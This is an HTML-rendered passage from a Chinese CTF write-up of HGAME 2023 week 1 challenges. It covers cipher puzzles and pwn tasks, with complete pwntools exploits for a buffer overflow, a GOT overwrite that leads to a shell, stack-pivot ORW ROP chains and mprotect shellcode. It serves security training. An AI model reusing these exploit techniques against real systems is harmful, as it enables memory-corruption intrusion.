class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        imi = Image.<span class="built_in">open</span>(<span class="string">f&quot;pics/enc<span class="subst">&#123;i&#125;</span>.png&quot;</span>)</span><br><span class="line">        imj = Image.<span class="built_in">open</span>(<span class="string">f&quot;pics/enc<span class="subst">&#123;j&#125;</span>.png&quot;</span>)</span><br><span class="line">        xorimg = xorImg(imj, imi)</span><br><span class="line">        xorimg.save(<span class="string">f&#x27;source/xor<span class="subst">&#123;i*<span class="number">16</span>+j&#125;</span>.png&#x27;</span>)</span><br><span class="line">        imi.close()</span><br><span class="line">        imj.close()</span><br></pre></td></tr></table></figure><p>最后获得模糊的flag图片：</p><p><img data-src="/./../images/xor246.png" alt="xor246"></p><h3 id="神秘的电话"><a href="#神秘的电话" class="headerlink" title="神秘的电话"></a>神秘的电话</h3><p>题目：</p><p>一个疑似base64编码的txt文件</p><p>一个播放起来是一个摩斯密码的wav文件</p><p>解法：</p><ol><li><p>提取出声音文件的信息：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">morse2ascii morse.wav</span><br></pre></td></tr></table></figure><p><img data-src="/./../images/image-20230114103532078.png" alt="image-20230114103532078"></p></li><li><p>base64解码：</p></li></ol><p><img data-src="/./../images/image-20230114103642721.png" alt="image-20230114103642721"></p><p>篱笆一一&gt;栅栏密码；倒着一一&gt;逆序；密匙一一&gt;维吉尼亚密码;北欧神话一一&gt;vidar</p><p>（这里用morse2ascii计算出的数据多了一些下划线，做法是每一处下划线都去掉一个就行）</p><p>最后flag:</p><p><img data-src="/./../images/image-20230114104040525.png" alt="image-20230114104040525"></p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="easy-overflow"><a href="#easy-overflow" class="headerlink" title="easy_overflow"></a>easy_overflow</h3><p>他妈的，这道死活搞不出来，看了wp才知道是close函数关闭了标准输出通道。需要在来个报错输出，把结果输出过来</p><p>题目没啥好讲的，直接上exp</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"><span class="comment"># io = remote(&quot;week-1.hgame.lwsec.cn&quot;,31267)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"><span class="comment"># main_addr = elf.sym[&#x27;main&#x27;]</span></span><br><span class="line">back_addr = elf.sym[<span class="string">&#x27;b4ckd0or&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">16</span> + p64(<span class="number">0</span>) + p64(back_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>运用1&gt;&amp;2将结果从报错信息中输出</p><p><img data-src="/./../images/image-20230114110109416.png" alt="image-20230114110109416"></p><h3 id="choose-the-seat"><a href="#choose-the-seat" class="headerlink" title="choose_the_seat"></a>choose_the_seat</h3><p>**HINTS:**数组下标的检查好像少了点东西</p><p>下标v0没有检查下界</p><p><img data-src="/./../images/image-20230114151906912.png" alt="image-20230114151906912"></p><p>seats在bss段，并只有seats写入。无法进行栈操作<img data-src="/./../images/image-20230114152100537.png" alt="image-20230114152100537"></p><p>思路：运用负下标进行got表覆盖，用got表泄漏libc的地址</p><ol><li>先用vuln函数覆盖exit的地址，防止程序退出，方便下次再次利用</li><li>再用setbuf的plt表进行泄漏got地址，再用指定的libc计算基地址</li><li>用基地址计算system的地址，再用system的地址覆盖puts的地址，puts地址的旁边正好可以存放binsh的地方，连着binsh一起覆盖了</li></ol><p>exp：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"><span class="comment"># io = remote(&#x27;week-1.hgame.lwsec.cn&#x27;,30536)</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>,<span class="string">&quot;splitw&quot;</span>,<span class="string">&quot;-h&quot;</span>]</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line">elf = ELF(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">vuln_addr = elf.sym[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line"></span><br><span class="line">sys_libc = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">libc_setbuf_addr = libc.sym[<span class="string">&#x27;setbuf&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;setbuf:&#x27;</span>,<span class="built_in">hex</span>(libc_setbuf_addr))</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;one.&#x27;</span>,<span class="built_in">str</span>(-<span class="number">6</span>))</span><br><span class="line">io.sendafter(<span class="string">b&#x27;your name&#x27;</span>,p64(vuln_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;vuln&quot;</span>,vuln_addr)</span><br><span class="line">b()</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;one.&#x27;</span>,<span class="built_in">str</span>(-<span class="number">8</span>))</span><br><span class="line">io.sendafter(<span class="string">b&#x27;your name&#x27;</span>,<span class="string">b&#x27;\xd0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;name is &#x27;</span>)</span><br><span class="line">setbuf_addr = u64(io.recvuntil(<span class="string">&#x27;Your seat&#x27;</span>).split(<span class="string">b&#x27;\nYour&#x27;</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;addr:&#x27;</span>,<span class="built_in">hex</span>(setbuf_addr))</span><br><span class="line"></span><br><span class="line">base_addr = setbuf_addr - libc_setbuf_addr</span><br><span class="line">sys_addr = base_addr + sys_libc</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;one.&#x27;</span>,<span class="built_in">str</span>(-<span class="number">9</span>))</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(sys_addr)</span><br><span class="line">io.sendafter(<span class="string">b&#x27;your name&#x27;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>这里在覆盖setbuf的地址时会写一个字母，字母所占位置不超过0x1000，因为一个内存页就是0x1000，所以无论基地址如何变，函数在内存页中的偏移地址不变，所以我们写一个字母也只是占用了偏移位置，对计算基地址并不会影响，所以我们查看指定libc中的setbuf（静态），将得到的setbuf的地址的偏移数值和我们泄漏出的偏移数值改成相同，再减去我们泄漏出的总值就能得到base_addr</p><p>下面把d0换成41就行，41就是我们写进去的’A’</p><p><img data-src="/./../images/image-20230114153844803.png" alt="image-20230114153844803"></p><p>如何这里减去总值：</p><p><img data-src="/./../images/image-20230114153925669.png" alt="image-20230114153925669"></p><p>这里还有一种做法就是写入\xd0,就是让地址不发生变化，这样计算基地址直接减去sym中找的地址就行，其实这种做法也就方便了一点点</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">io.sendafter(<span class="string">b&#x27;your name&#x27;</span>,<span class="string">b&#x27;\xd0&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;name is &#x27;</span>)</span><br><span class="line">setbuf_addr = u64(io.recvuntil(<span class="string">&#x27;Your seat&#x27;</span>).split(<span class="string">b&#x27;\nYour&#x27;</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;addr:&#x27;</span>,<span class="built_in">hex</span>(setbuf_addr))</span><br></pre></td></tr></table></figure><p>binsh的地址正好是下标0x10的整数倍，然后后面就是puts的地址，可以说出题人别有用心了</p><p><img data-src="/./../images/image-20230114153109502.png" alt="image-20230114153109502"></p><p>这里有两种做法，一种是从-9这个下标写入binsh的字符串和system的地址，让程序调用puts间接调用sytem函数</p><p>第二种做法就是用one_gadget查找libc中，执行binsh的指令</p><p><img data-src="/./../images/image-20230116195715458.png" alt="image-20230116195715458"></p><p>这里其实条件比较苛刻，要求一些寄存器中的地址对应的内容为null，这里存在偶然性，不过也是可以的</p><p>所以我们采用第一种方法</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">io.sendlineafter(<span class="string">b&#x27;one.&#x27;</span>,<span class="built_in">str</span>(-<span class="number">9</span>))</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(sys_addr)</span><br><span class="line">io.sendafter(<span class="string">b&#x27;your name&#x27;</span>,payload)</span><br></pre></td></tr></table></figure><p>这里我们可以先打开tmux终端，在tmux运行exp，前提是exp设置了context.terminal &#x3D; [“tmux”,”splitw”,”-h”]，然后进行gdb.attch</p><p>这里方便起见我们可以设置一个调试函数，方便exp运行时临时调试程序</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">b</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br></pre></td></tr></table></figure><p>将这个函数放置到我们想调试的地方</p><p>效果：</p><p><img data-src="/./../images/image-20230116200235063.png" alt="image-20230116200235063"></p><p>然后再gdb先后输入got一一&gt;p&#x2F;x *(地址),就可以查看某个got中的内容了</p><p><img data-src="/./../images/image-20230116200809156.png" alt="image-20230116200809156"></p><p><img data-src="/./../images/image-20230116200845999.png" alt="image-20230116200845999"></p><p>这里吐槽一下，其实gdb新版本可以直接看到got表的内容，我这个gdb已经是ubuntu20.02的最高版本了，我这个docker就不折腾了</p><p>（PIE全称是position-independent executable，中文解释为地址无关可执行文件，该技术是一个针对代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术，如果程序开启了PIE保护的话，在每次加载程序时都变换加载地址，从而不能通过ROPgadget等一些工具来帮助解题。解法：内存是以页载入机制，如果开启PIE保护的话，只能影响到单个内存页，一个内存页大小为0x1000，那么就意味着不管地址怎么变，某一条指令的后三位十六进制数的地址是始终不变的。因此我们可以通过覆盖地址的后几位来可以控制程序的流程）</p><p>结果：</p><p><img data-src="/./../images/image-20230116201152048.png" alt="image-20230116201152048"></p><h3 id="ORW"><a href="#ORW" class="headerlink" title="ORW"></a>ORW</h3><p><strong>CTF中这类PWN题目通常通过禁用execve系统调用添加沙箱，不能直接执行命令getshell，这时候需要通过调用open、read、write这样的函数打开flag，存到内存中，再输出</strong></p><p>将三个函数开头字母作为简称，也就是orw</p><p>可以通过<a href="https://github.com/david942j/seccomp-tools">seccomp-tools</a>来判断是否添加沙箱，以及查看沙箱的规则</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">seccomp-tools dump ./pwn</span><br></pre></td></tr></table></figure><p>像这样就是比较经典的只允许64位的read、write、open三个系统调用，其他的系统调用号都被禁止</p><p>这里需要用到栈迁移</p><p>栈迁移的本质就是控制rsp和rbp，将栈帧转移到我们想要的位置，这里需要执行两次leave;return。</p><p>leave&#x3D;mov rsp,rbp;pop rbp所以第一次不能将rsp进行改变</p><p>第一次是将rbp转移，第二次是将rsp转移。</p><p>栈迁移条件：</p><ol><li>存在 <strong>leave ret</strong> 这类gadget指令</li><li>存在可执行shellcode的内存区域</li></ol><p>链接：<a href="https://www.cnblogs.com/max1z/p/15299000.html">栈迁移原理介绍与应用 - Max1z - 博客园 (cnblogs.com)</a></p><p>这里说明一下：open拿到的只是文件句柄，里面没有文件内容，要读文件内容还是要执行read，read的参数就要求文件句柄，read的功能就是将硬盘文件内容读到内存中的某一块缓冲区中，然后write负责将缓冲区中的内容写进屏幕中</p><p>题目中溢出长度为0x30,那注入地址为0x30&#x2F;0x8&#x3D;6,就6条显然不能构成rop链</p><p>进行栈迁移，由于我没做过栈迁移的题，这里详细写一下</p><p>第一次溢出，把rbp放到别的地方,然后泄漏puts的内存地址,rbp放到bss+0x200，这个地址其实是程序地址之外的空间了，所以拿来当作新栈对程序不产生影响</p><p><img data-src="/./../images/image-20230115211905558.png" alt="image-20230115211905558"></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x100</span> + p64(bss+<span class="number">0x200</span>)</span><br><span class="line">payload1 += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)</span><br></pre></td></tr></table></figure><p>计算基地址，算出orw三个函数的地址</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">success(<span class="string">&#x27;puts:&#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">base_addr = puts_addr - libc_puts</span><br><span class="line">open_addr = libc.sym[<span class="string">&#x27;open&#x27;</span>] + base_addr</span><br><span class="line">read_addr = libc.sym[<span class="string">&#x27;read&#x27;</span>] + base_addr</span><br><span class="line">write_addr = libc.sym[<span class="string">&#x27;write&#x27;</span>] + base_addr</span><br></pre></td></tr></table></figure><p>第二次溢出，将rbp放置到新栈</p><p><img data-src="/./../images/image-20230115212222119.png" alt="image-20230115212222119"></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x100</span></span><br><span class="line">payload += p64(bss + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(vuln_addr + <span class="number">0x0F</span>)</span><br><span class="line">io.send(payload)</span><br></pre></td></tr></table></figure><p>执行完第二次溢出后，rsp在旧栈位置，rbp在新栈位置，为了让rbp在新栈位置不发生移动，这里我们直接将之后的函数直接定位到read函数上，+0xf，因为read函数之前有对rbp和rsp进行操作</p><p>第三次溢出，将进行两次leave；ret，这样rsp就将锁定在新栈的栈顶位置，因为ret主要是靠rsp来控制程序流，rbp只是拿来定位局部变量</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">payload2 = <span class="string">b&#x27;/flag\x00\x00\x00&#x27;</span></span><br><span class="line">payload2 += p64(pop_rdi_ret)</span><br><span class="line">payload2 += p64(<span class="number">0x404160</span>) <span class="comment">#这里就是新rbp-0x100的地方，也就是刚写&#x27;/flag\x00\x00\x00&#x27;的地址</span></span><br><span class="line">payload2 += p64(pop_rsi_ret)</span><br><span class="line">payload2 += p64(<span class="number">0</span>)</span><br><span class="line">payload2 += p64(open_addr)</span><br><span class="line"></span><br><span class="line">payload2 += p64(pop_rdi_ret)</span><br><span class="line">payload2 += p64(<span class="number">0x3</span>) </span><br><span class="line">payload2 += p64(pop_rsi_ret)</span><br><span class="line">payload2 += p64(<span class="number">0x404711</span>)   <span class="comment"># 可能是指定缓冲区地址</span></span><br><span class="line">payload2 += p64(pop_rdx_ret)</span><br><span class="line">payload2 += p64(<span class="number">0x100</span>)</span><br><span class="line">payload2 += p64(read_addr)</span><br><span class="line"></span><br><span class="line">payload2 += p64(pop_rdi_ret)</span><br><span class="line">payload2 += p64(<span class="number">0x1</span>)</span><br><span class="line">payload2 += p64(pop_rsi_ret)</span><br><span class="line">payload2 += p64(<span class="number">0x404711</span>)</span><br><span class="line">payload2 += p64(pop_rdx_ret)</span><br><span class="line">payload2 += p64(<span class="number">0x100</span>)</span><br><span class="line">payload2 += p64(write_addr)</span><br><span class="line"></span><br><span class="line">payload2 = payload2.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload2 += p64(<span class="number">0x404160</span>)   <span class="comment"># 这里就是第一次pop rbp后rbp的位置，第二次pop要往我们想要的栈顶走，把rsp移过去</span></span><br><span class="line">payload2 += p64(leave_ret_addr)</span><br></pre></td></tr></table></figure><p>所以第三次的rbp最终位置不用去管它，rbp的任务就是让rsp锁定到新栈栈顶位置就行</p><p>这里read和write都需要三个参数，64位，函数从左到右寄存器分别是rdi,rsi,rdx</p><p>通过pop ret指令来控制rsp从而控制程序流</p><p>以上就是栈迁移的详细内容</p><p>完整代码：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./vuln&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;week-1.hgame.lwsec.cn&#x27;</span>,<span class="number">31266</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal =  [<span class="string">&quot;konsole&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line"></span><br><span class="line">vuln_addr = elf.sym[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line">libc_puts = libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">leave_ret_addr = <span class="number">0x4012be</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0401393</span></span><br><span class="line">bss = <span class="number">0x404060</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一次溢出，把rbp放到别的地方,然后泄漏puts的内存地址</span></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x100</span> + p64(bss+<span class="number">0x200</span>)</span><br><span class="line">payload1 += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&#x27;task.\n&#x27;</span>,payload1)</span><br><span class="line">puts_addr = u64(io.recvline().split(<span class="string">b&#x27;\n&#x27;</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;puts:&#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">base_addr = puts_addr - libc_puts</span><br><span class="line">open_addr = libc.sym[<span class="string">&#x27;open&#x27;</span>] + base_addr</span><br><span class="line">read_addr = libc.sym[<span class="string">&#x27;read&#x27;</span>] + base_addr</span><br><span class="line">write_addr = libc.sym[<span class="string">&#x27;write&#x27;</span>] + base_addr</span><br><span class="line">pop_rsi_ret = <span class="number">0x02601f</span> + base_addr</span><br><span class="line">pop_rdx_ret = <span class="number">0x142c92</span> + base_addr</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x100</span></span><br><span class="line">payload += p64(bss + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(vuln_addr + <span class="number">0x0F</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二次溢出，将rbp放到二次写入的开始处，将rsp放到与rbp相同位置</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;/flag\x00\x00\x00&#x27;</span></span><br><span class="line">payload2 += p64(pop_rdi_ret)</span><br><span class="line">payload2 += p64(<span class="number">0x404160</span>) <span class="comment">#这里就是新rbp-0x100的地方，也就是刚写&#x27;/flag\x00\x00\x00&#x27;的地址</span></span><br><span class="line">payload2 += p64(pop_rsi_ret)</span><br><span class="line">payload2 += p64(<span class="number">0</span>)</span><br><span class="line">payload2 += p64(open_addr)</span><br><span class="line"></span><br><span class="line">payload2 += p64(pop_rdi_ret)</span><br><span class="line">payload2 += p64(<span class="number">0x3</span>) </span><br><span class="line">payload2 += p64(pop_rsi_ret)</span><br><span class="line">payload2 += p64(<span class="number">0x404711</span>)   <span class="comment"># 指定缓冲区地址,随意</span></span><br><span class="line">payload2 += p64(pop_rdx_ret)</span><br><span class="line">payload2 += p64(<span class="number">0x100</span>)</span><br><span class="line">payload2 += p64(read_addr)</span><br><span class="line"></span><br><span class="line">payload2 += p64(pop_rdi_ret)</span><br><span class="line">payload2 += p64(<span class="number">0x1</span>)</span><br><span class="line">payload2 += p64(pop_rsi_ret)</span><br><span class="line">payload2 += p64(<span class="number">0x404711</span>)</span><br><span class="line">payload2 += p64(pop_rdx_ret)</span><br><span class="line">payload2 += p64(<span class="number">0x100</span>)</span><br><span class="line">payload2 += p64(write_addr)</span><br><span class="line"></span><br><span class="line">payload2 = payload2.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload2 += p64(<span class="number">0x404160</span>)   <span class="comment"># 这里就是第一次pop rbp后rbp的位置，第二次pop要往我们想要的栈顶走，把rsp移过去</span></span><br><span class="line">payload2 += p64(leave_ret_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.send(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>最后结果：</p><p><img data-src="/./../images/image-20230115214426688.png" alt="image-20230115214426688"></p><p>这里还有一种做法，原本程序开启了NX保护，我们可以通过libc中的mprotect函数给一段内存区域更改权限，然后在栈中写入shellcode，然后让程序执行栈中的shellcode，这里shellcode也很长，也需要用到栈迁移</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">payload2 = p64(<span class="number">0</span>)   <span class="comment">#0x404160</span></span><br><span class="line">payload2 += p64(pop_rdi_ret)</span><br><span class="line">payload2 += p64(<span class="number">0x404000</span>) <span class="comment">#这里是mprotect函数要操作的开始地址   #0x404170</span></span><br><span class="line">payload2 += p64(pop_rsi_ret)</span><br><span class="line">payload2 += p64(<span class="number">0x1000</span>)          <span class="comment"># 要操作的大小 #0x404180</span></span><br><span class="line">payload2 += p64(pop_rdx_ret)</span><br><span class="line">payload2 += p64(<span class="number">7</span>)  <span class="comment"># 7代表可读可写可执行权限   #0x404190</span></span><br><span class="line">payload2 += p64(mprotect_addr)</span><br><span class="line">payload2 += p64(<span class="number">0x4041a8</span>)       <span class="comment">#0x4041a0</span></span><br><span class="line">payload2 += asm(shellcraft.<span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>,<span class="number">1</span>))   </span><br><span class="line">payload2 += asm(shellcraft.read(<span class="number">3</span>,<span class="number">0x404500</span>,<span class="number">100</span>))</span><br><span class="line">payload2 += asm(shellcraft.write(<span class="number">1</span>,<span class="number">0x404500</span>,<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line">payload2 = payload2.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload2 += p64(<span class="number">0x404160</span>)   <span class="comment"># 这里就是第一次pop rbp后rbp的位置，第二次pop要往我们想要的栈顶走，把rsp移过去</span></span><br><span class="line">payload2 += p64(leave_ret_addr)</span><br></pre></td></tr></table></figure><p>mprotect参数有三，起始地址，长度，权限</p><p>这里程序出了bug，flag中g实在写不进去不知道为啥(更新，没设置64位，加上context.arch &#x3D; “amd64”这句就行，因为系统默认32位，&#x2F;flag的字符串正好超出4字节数据)</p><p>完整代码：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./vuln&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;week-1.hgame.lwsec.cn&#x27;</span>,<span class="number">31266</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="comment"># context.log_level = &quot;debug&quot;</span></span><br><span class="line"><span class="comment"># context.terminal =  [&quot;konsole&quot;, &quot;-e&quot;]</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">vuln_addr = elf.sym[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line">libc_puts = libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">leave_ret_addr = <span class="number">0x4012be</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0401393</span></span><br><span class="line">bss = <span class="number">0x404060</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一次溢出，把rbp放到别的地方,然后泄漏puts的内存地址</span></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x100</span> + p64(bss+<span class="number">0x200</span>)</span><br><span class="line">payload1 += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&#x27;task.\n&#x27;</span>,payload1)</span><br><span class="line">puts_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;puts:&#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">base_addr = puts_addr - libc_puts</span><br><span class="line">mprotect_addr = libc.sym[<span class="string">&#x27;mprotect&#x27;</span>] + base_addr</span><br><span class="line">pop_rsi_ret = <span class="number">0x02601f</span> + base_addr</span><br><span class="line">pop_rdx_ret = <span class="number">0x142c92</span> + base_addr</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x100</span></span><br><span class="line">payload += p64(bss + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(vuln_addr + <span class="number">0x0F</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二次溢出，将rbp放到二次写入的开始处，将rsp放到与rbp相同位置</span></span><br><span class="line"></span><br><span class="line">payload2 = p64(<span class="number">0</span>)   <span class="comment">#0x404160</span></span><br><span class="line">payload2 += p64(pop_rdi_ret)</span><br><span class="line">payload2 += p64(<span class="number">0x404000</span>) <span class="comment">#这里是mprotect函数要操作的开始地址   #0x404170</span></span><br><span class="line">payload2 += p64(pop_rsi_ret)</span><br><span class="line">payload2 += p64(<span class="number">0x1000</span>)          <span class="comment"># 要操作的大小 #0x404180</span></span><br><span class="line">payload2 += p64(pop_rdx_ret)</span><br><span class="line">payload2 += p64(<span class="number">7</span>)  <span class="comment"># 7代表可读可写可执行权限   #0x404190</span></span><br><span class="line">payload2 += p64(mprotect_addr)</span><br><span class="line">payload2 += p64(<span class="number">0x4041a8</span>)       <span class="comment">#0x4041a0</span></span><br><span class="line">payload2 += asm(shellcraft.<span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>,<span class="number">1</span>))   </span><br><span class="line">payload2 += asm(shellcraft.read(<span class="number">3</span>,<span class="number">0x404500</span>,<span class="number">100</span>))</span><br><span class="line">payload2 += asm(shellcraft.write(<span class="number">1</span>,<span class="number">0x404500</span>,<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line">payload2 = payload2.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload2 += p64(<span class="number">0x404160</span>)   <span class="comment"># 这里就是第一次pop rbp后rbp的位置，第二次pop要往我们想要的栈顶走，把rsp移过去</span></span><br><span class="line">payload2 += p64(leave_ret_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.send(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="simple-shellcode"><a href="#simple-shellcode" class="headerlink" title="simple_shellcode"></a>simple_shellcode</h3><p>题目：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  mmap((<span class="type">void</span> *)<span class="number">0xCAFE0000</span>LL, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">33</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input your shellcode:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, (<span class="type">void</span> *)<span class="number">0xCAFE0000</span>LL, <span class="number">0x10</span>uLL);</span><br><span class="line">  sandbox();</span><br><span class="line">  MEMORY[<span class="number">0xCAFE0000</span>]();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目用mmap映射出一段以0xCAFE0000开始，长度为0x1000，权限是7（可读可写可执行）</p><p>用sandbox设置了系统权限</p><p>这里向0xCAFE0000读入16字节，可以考虑rop，但检查保护时，就放弃了</p><p><img data-src="/./../images/image-20230116111016050.png" alt="image-20230116111016050"></p><p>写入shellcode,用orw的话，长度也远远不够</p><p>HINTS:</p><p>一次read不够多，为什么不再读一次呢？</p><p>第一次将read的shellcode读入，然后再程序执行0xCAFE0000这段内存，从而执行读入的read，那就要好好设计一波read的shellcode了，起初我是用rdi这种64位的寄存器写的，但是最终长度远远超过16字节</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span 